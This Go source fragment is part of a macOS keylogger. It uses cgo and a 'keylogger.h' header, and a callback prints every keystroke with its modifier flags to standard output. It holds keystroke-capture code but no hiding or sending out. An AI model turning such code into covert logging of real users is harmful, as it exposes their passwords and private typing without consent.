package main

// #cgo LDFLAGS: -framework ApplicationServices -framework Carbon
// #include "keylogger.h"
// #include <stdlib.h>
import "C"
import (
	"fmt"
	"strings"
	"unicode"
)
import "unsafe"

//export handleKeyPress
func handleKeyPress(
	printableRepresentationC *C.char,
	keyCodeC C.int,
	capsC C.bool,
	shiftC C.bool,
	optionC C.bool,
	cmdC C.bool,
	controlC C.bool,
) {
	keyCode := int(keyCodeC)
	caps := bool(capsC)
	shift := bool(shiftC)
	option := bool(optionC)
	cmd := bool(cmdC)
	control := bool(controlC)

	//key := parseKeyEnglishQwerty(keyCode, shift, caps)
	key := C.GoString(printableRepresentationC)

	key = strings.TrimSpace(key)
	if len(key) == 0 || unicode.IsControl([]rune(key)[0]) {
		key = nonPrintableCharacter(keyCode, shift, caps)
	}

	fmt.Printf("%s, code: %d, caps: %t, shift: %t, option: %t, cmd: %t, control: %t\n",
		key, keyCode, caps, shift, option, cmd, control)
	C.free(unsafe.Pointer(printableRepresentationC))
}
func main() {
	C.start()
}
func c(condition bool, first string, second string) string {
	if condition {
		return first
	} else {
		return second
	}
}
